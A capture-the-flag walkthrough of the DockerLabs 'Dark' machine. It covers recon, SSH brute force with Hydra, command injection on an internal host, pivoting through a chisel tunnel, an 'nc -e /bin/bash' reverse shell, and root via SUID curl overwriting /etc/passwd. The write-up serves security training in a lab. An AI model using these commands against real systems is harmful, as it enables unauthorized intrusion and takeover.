![Screenshot](/medium/Dark/Images/machine.png)

Difficulty: **medium**

Made by: **makak77**

---
# Steps to pwn 🥽

* 👁️ [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🔄 [Pivoting](#pivoting)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all, we make sure the machines are really up, we can make sure with the command **ping**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ ping 10.10.10.2
PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.
64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.243 ms
64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.093 ms
64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.200 ms
^C
--- 10.10.10.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.093/0.178/0.243/0.063 ms
```

Now we can start the phase of **reconnaissance**

---
# Reconnaissance

We can start to scan what ports are open to the first machine, we can do this with nmap.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 10.10.10.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 22:55 -05
Initiating ARP Ping Scan at 22:55
Scanning 10.10.10.2 [1 port]
Completed ARP Ping Scan at 22:55, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:55
Scanning 10.10.10.2 [65535 ports]
Discovered open port 80/tcp on 10.10.10.2
Discovered open port 22/tcp on 10.10.10.2
Completed SYN Stealth Scan at 22:55, 3.62s elapsed (65535 total ports)
Nmap scan report for 10.10.10.2
Host is up, received arp-response (0.000032s latency).
Scanned at 2025-11-07 22:55:15 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:0A:0A:0A:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.98 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see 2 ports open:

- port 22 (ssh / secure shell)
- port 80 (http / hyper-text transfer protocol)

We want to know more about this 2 ports, we can also do it with nmap.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ nmap -p22,80 -sCV 10.10.10.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 23:00 -05
Nmap scan report for 10.10.10.2
Host is up (0.000097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3f:52:53:45:8b:99:34:47:19:12:64:d1:f4:d4:23:b9 (ECDSA)
|_  256 c5:04:3d:16:6b:71:f6:a0:74:92:74:9c:a3:7a:80:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: darkweb
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we type.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

After this scan finish we see a website, we can search what technologies uses this website with **whatweb**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ whatweb http://10.10.10.2
http://10.10.10.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[10.10.10.2], Title[darkweb]
```

---
# Enumeration

We can see this, uses apache but nothing else interesting, we can take a look to the website with the browser.

![Screenshot](/medium/Dark/Images/image1.png)

We see this, translated it says **"Enter an url"** we can try if it's vulnerable to SQLI, XSS, but we got nothing.

It seems me can enter an url from any website, we can try to do it with http://example.com

![Screenshot](/medium/Dark/Images/image2.png)

We got the page from the example.com, we can also try if it also get's the page from **YouTube.**

![Screenshot](/medium/Dark/Images/image3.png)

And it works too, but nothing else interesting, we can try enumerate possible directories with **gobuster**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ gobuster dir -u http://10.10.10.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,html
```

**dir** <- With this argument we make a enumeration of directories with the website.

**-u** <- With this argument we select the target to enumerate.

**-w** <- With this argument we select the dictionary to apply to the enumeration.

**-x** <- With this argument we can also add a extension per each payload, you can also enumerate this type of extensions like: php, py, txt, js, html and much more. But if you add more extentions it will take more time to finish the enumeration.

And we can see this:

![Screenshot](/medium/Dark/Images/image4.png)

We get a path **/info** let's take a look with the browser.

![Screenshot](/medium/Dark/Images/image5.png)

We got a lot of information here, we can see a possible user **Toni** and another website from the ip address **20.20.20.3**, let's take a look to the website with the browser.

but we can notice, this IP address we can't access into, we can try from the another website from the ip address **10.10.10.2** if we can see the other page (20.20.20.3)

![Screenshot](/medium/Dark/Images/image6.png)

And we can see this, it's very important this information, because it seems the IP 10.10.10.2 and the other IP 20.20.20.3 are in the same network, this means this IP addresses are in a local network that we can't see into.

![Screenshot](/medium/Dark/Images/image7.png)

We can see a local network between these 2 ip address, Only the attacker can see the 10.10.10.2 machine, and only this machine can see the 20.20.20.3 machine.

Okay now, we can see the another website, we can try to intercept the request what it's doing the website, we can do this with **burpsuite**

And we can see this:

```
POST /process.php HTTP/1.1
Host: 20.20.20.3
Content-Length: 8
Cache-Control: max-age=0
Origin: http://10.10.10.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.8
Referer: http://10.10.10.2/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

cmd=test
```

We can see argument **cmd** but we don't get nothing.

We need to reach to the 20.20.20.3 machine, how can we do it? first of all we need to hack the first machine.

Now can begin the **exploitation** phase

---
# Exploitation

Remember we got a possible user **Toni**, we can try to brute force this user through ssh to the first machine. We can do this with **hydra**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ hydra -t 20 -l toni -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
```

**-t** <- With this argument we are going to tell to hydra to display some threads, by each thread are going to do this attack and the others ones at the same time, with this the attack will be faster.

**-L** <- With this argument hydra are going to try multiple users, if we only want only one user we can do it with **-l**

**-P** <- With this argument hydra are going to try multiple passwords, if we only want to try one password we can do it with **-p**

ssh://10.10.10.2 <- With this argument hydra are going to attack this port ssh (the port 22 we discover before)

And finally we can see this:

![Screenshot](/medium/Dark/Images/image8.png)

We got the password of the user **Toni**, his password is **banana**. then we login with ssh.

And finally we are in into the first machine.

In this machine we can't make privilege escalation, I do a very long enumeration if any binary have SUID, any process behind being executed, but we got nothing.

Then we can try to jump immediately to the 2nd machine from the 1st machine.

we can see all the possible interfaces on this machine with **hostname -i** 

```
toni@a55f89c0b34b:~$ hostname -i
10.10.10.2 20.20.20.2
```

And we can see the another machine from here, we can try to make a **curl** request if we can see it here.

```
toni@a55f89c0b34b:~$ curl http://20.20.20.3
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```

And we can see the content from the page.

Remember we got something interesting before with the request from the website, we intercept the request with burpsuite, at the end of the request we got this: 

- **cmd=test**

it seems we can type commands here we can try to make a POST request with curl, to send the cmd argument and the command we want.

```
toni@a55f89c0b34b:~$ curl http://20.20.20.3/process.php -d 'cmd=id'
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

**-d**  <- With this argument we send data over the post request in this case we are sending **cmd=id**

And we can see here a response, we got the id from the user www-data, we got an RCE here!

Now the fun begins, we can begin the **pivoting** phase.

---
# Pivoting

We can try to make an reverse shell through this machine to our attacker machine, but remember has his own local network, we can make a tunnel with **chisel** to travel the traffic from this machine to the attacker machine.

![Screenshot](/medium/Dark/Images/image9.png)

To better understand this concept we are going to do it.

First of all, we send chisel, to the first machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ sudo cp /usr/bin/chisel .
```

we copy the binary, then we send it with **scp**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ scp chisel toni@10.10.10.2:/home/toni
toni@10.10.10.2's password: 
chisel                                                                            100%   10MB  16.8MB/s   00:00
```

we send chisel to the home directory of the user toni.

Now we make a server with chisel in our attacker machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ chisel server --reverse -p 1234
2025/11/08 15:39:09 server: Reverse tunnelling enabled
2025/11/08 15:39:09 server: Fingerprint wAZXg+/fW4GqBM51bchNRQhM9xhFLIHpHIkW5zuNGQI=
2025/11/08 15:39:09 server: Listening on http://0.0.0.0:1234
```

**--reverse** <- With this argument we are making that the traffic travels to our chisel server.

**-p** <- With this argument we specify the port to connect into in this case we are using the port 1234

Now, we connect the 1st machine to be as **client** to **our server**.

```
toni@a55f89c0b34b:~$ ./chisel client 192.168.0.20:1234 0.0.0.0:3000:192.168.0.20:3000
2025/11/08 20:55:55 client: Connecting to ws://192.168.0.20:1234
2025/11/08 20:55:55 client: tun: proxy#3000=>192.168.0.20:3000: Listening
2025/11/08 20:55:55 client: Connected (Latency 643.92µs)
```

 With this command we are making a new port **3000** to the 1st machine, and then making that the traffic that travels to this port, reach to our attacker's ip address, and also to the port 3000 to our attacker's machine.

We did this to make the reverse shell to travel to our port 3000.

Now we open another terminal to our attacker's machine, to open the port 3000 with netcat.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ nc -lvnp 3000
listening on [any] 3000 ...
```

**-l**  <- This argument makes to netcat to be in mode listening.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Now we launch the next command on the 1st machine with the user toni:

```
toni@a55f89c0b34b:~$ curl http://20.20.20.3/process.php -d 'cmd=nc -e /bin/bash 20.20.20.2 3000'
```

With netcat we are executing bash to make a shell, and we are connecting to the 1st machine with the port 3000, but remember that we did that chisel makes the traffic from the port 3000 travels to our port 3000 to the attacker's IP address, reaching all the traffic to us.

Now we can see this:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ nc -lvnp 3000
listening on [any] 3000 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.20] 41686
whoami
www-data
```

we got success! now we are on the 2nd machine, using chisel to send all the traffic to us.

Now it comes to treat the tty, to be more comfortable with the terminal

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@65134a849c27:/var/www/html$ 
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/dark]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@5134a849c27:/var/www/html$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

Now it comes the **privilege escalation** phase.

---
# Privilege Escalation

We can see what possible binaries have SUID (Set User Id) this means that the command who have this, are being executed by the proprietary, mostly as the user **root**.

```
www-data@65134a849c27:/$ find / -perm -4000 2>/dev/null
```

With this command we are trying to find anything beginning from the directory root being recursively who have permissions of SUID (-4000) and we got this:

```
www-data@65134a849c27:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/curl
/usr/bin/sudo
```

We notice immediately that the command **curl** have this permission of SUID, the command curl can make request to a website like, POST, GET, etc... obviously the interesting one it's the GET request, with curl, we can get the content from a file with a website.

This is dangerous because we can save anything on any path and on any file from the system.

We can modify the **/etc/passwd** file and save it then, we can do this:

```
www-data@65134a849c27:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

We get the content from the passwd file then we modify the content from the passwd file, to eliminate the password from the user root.

But remember that this machine are connected to the 1st machine (10.10.10.2), so we are putting this file to this machine.

![Screenshot](/medium/Dark/Images/image10.png)

Now we save this file as **passwd**, and now we make a server with php from the 1st machine.

```
toni@a55f89c0b34b:~$ php -S 0.0.0.0:4444
[Sat Nov  8 21:56:05 2025] PHP 8.2.18 Development Server (http://0.0.0.0:4444) started
```

Now from the 2nd machine we go to the directory **/usr/bin**

```
www-data@65134a849c27:/usr/bin$ ./curl http://20.20.20.2:4444/passwd -o /etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1086  100  1086    0     0  19026      0 --:--:-- --:--:-- --:--:-- 19392
```

**-o /etc/passwd** <- With this argument we are saving the content from the website 20.20.20.2 / passwd to /etc/passwd, we are overwriting this file.

Now we can see the first line of the /etc/passwd file and we see this:

```
www-data@65134a849c27:/usr/bin$ head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash
```

we changed successfully the passwd file! now we can change to the user root without a password!

```
www-data@65134a849c27:/usr/bin$ su root
root@65134a849c27:/usr/bin# whoami
root
```

now we are root ***...pwned!...*** 
